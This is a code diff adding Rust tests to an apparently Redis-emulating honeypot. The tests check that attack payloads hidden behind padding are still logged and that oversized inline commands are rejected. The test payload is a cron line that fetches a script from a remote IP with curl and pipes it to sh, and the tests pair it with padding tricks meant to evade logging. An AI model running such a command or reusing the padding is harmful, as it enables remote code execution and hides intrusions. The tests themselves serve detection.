@@ -596,6 +596,82 @@ async fn no_outbound_connections_during_full_command_sequence() {
     );
 }
 
+/// A payload behind padding that sanitization removes was recorded as an empty value: the ledger
+/// cut a 4 KiB prefix before sanitizing, so line breaks, NULs and zero-width characters ahead of
+/// the payload used the whole prefix. Sent as real commands, every padded form must still put the
+/// payload in the event for SET, CONFIG SET dir and EVAL.
+#[tokio::test]
+async fn a_payload_behind_removable_padding_is_recorded_for_set_config_set_and_eval() {
+    const PAYLOAD: &str = "*/1 * * * * root curl http://203.0.113.9/x | sh";
+    let paddings: [(&str, Vec<u8>); 4] = [
+        ("line breaks and tabs", b"\r\n\t".repeat(3000)),
+        ("NULs", vec![0u8; 9000]),
+        (
+            "zero-width characters",
+            "\u{200b}".repeat(3000).into_bytes(),
+        ),
+        ("terminal escapes", b"\x1b[2K\x00".repeat(1500)),
+    ];
+    let (addr, log_path, handle, _dir) = start_server().await;
+    let mut conn = TcpStream::connect(addr).await.unwrap();
+    for (_, pad) in &paddings {
+        let mut padded = pad.clone();
+        padded.extend_from_slice(PAYLOAD.as_bytes());
+        send_multibulk_bytes(&mut conn, &[b"SET", b"k", &padded]).await;
+        read_until_contains(&mut conn, b"+OK\r\n").await;
+        send_multibulk_bytes(&mut conn, &[b"CONFIG", b"SET", b"dir", &padded]).await;
+        read_until_contains(&mut conn, b"+OK\r\n").await;
+        send_multibulk_bytes(&mut conn, &[b"EVAL", &padded, b"0"]).await;
+        read_until_contains(&mut conn, b"\r\n").await;
+    }
+    drop(conn);
+    tokio::time::sleep(Duration::from_millis(200)).await;
+    handle.abort();
+
+    let events: Vec<_> = read_events(&log_path)
+        .await
+        .into_iter()
+        .filter(|e| e.signal_type == sensor_wire::SIGNAL_HONEYPOT_COMMAND_EXEC)
+        .collect();
+    assert_eq!(events.len(), paddings.len() * 3);
+    for (i, event) in events.iter().enumerate() {
+        let (label, _) = &paddings[i / 3];
+        let recorded = match event.metadata["command"].as_str().unwrap() {
+            "EVAL" => event.metadata["args"][0].as_str().unwrap(),
+            _ => event.metadata["value"].as_str().unwrap(),
+        };
+        assert!(
+            recorded.contains(PAYLOAD),
+            "{label} before {}: recorded {recorded:?}",
+            event.metadata["command"]
+        );
+    }
+}
+
+/// One inline line is held to the multi-bulk argument cap: 28,700 one-byte words made the parser
+/// and the dispatcher hold about 1.4 MB of argument lists per command, charged to nothing. A line
+/// at the cap is still a command; one past it is the protocol error a bad multi-bulk count gets.
+#[tokio::test]
+async fn an_inline_line_past_the_argument_cap_is_a_protocol_error() {
+    let (addr, _log_path, handle, _dir) = start_server().await;
+    let mut conn = TcpStream::connect(addr).await.unwrap();
+    let at_cap = format!("PING {}", vec!["a"; 1023].join(" "));
+    send_inline(&mut conn, &at_cap).await;
+    read_until_contains(
+        &mut conn,
+        b"-ERR wrong number of arguments for 'ping' command\r\n",
+    )
+    .await;
+
+    let flood = vec!["a"; 28_000].join(" ");
+    send_inline(&mut conn, &flood).await;
+    read_until_contains(&mut conn, b"-ERR Protocol error\r\n").await;
+    let mut rest = Vec::new();
+    let closed = tokio::time::timeout(Duration::from_secs(3), conn.read_to_end(&mut rest)).await;
+    assert!(closed.is_ok(), "the session ends after the protocol error");
+    handle.abort();
+}
+
 fn walkdir_or_manual(dir: &std::path::Path) -> Vec<std::path::PathBuf> {
     let mut files = Vec::new();
     fn walk(dir: &std::path::Path, files: &mut Vec<std::path::PathBuf>) {
